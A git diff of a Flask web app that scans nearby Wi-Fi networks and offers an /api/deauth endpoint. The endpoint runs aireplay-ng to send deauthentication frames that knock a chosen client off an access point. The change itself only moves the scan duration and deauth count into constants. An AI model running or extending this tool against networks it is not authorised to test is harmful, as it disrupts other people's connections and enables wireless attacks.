@@ -2,7 +2,10 @@ from flask import Flask, render_template, jsonify, request
 import subprocess
 from scanner import scan_wifi
 
-app = Flask(__name__)
+TIME = 30
+DEAUTH = "10"
+
+app = Flask(__name__, static_url_path='/static')
 
 @app.route('/')
 def index():
@@ -11,7 +14,7 @@ def index():
 @app.route('/api/wifi')
 def api_wifi():
     iface = request.args.get("iface", default="wlan0")
-    results = scan_wifi(30, iface=iface)
+    results = scan_wifi(TIME, iface=iface)
     return jsonify(results)
 
 @app.route("/api/deauth", methods=["POST"])
@@ -30,7 +33,7 @@ def deauth():
         subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True)
 
         subprocess.Popen(
-            ["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", station, iface]
+            ["aireplay-ng", "--deauth", DEAUTH, "-a", bssid, "-c", station, iface]
         )
         return jsonify({"message": f"Deauth sent to {station} via {iface}"})
     except Exception as e:
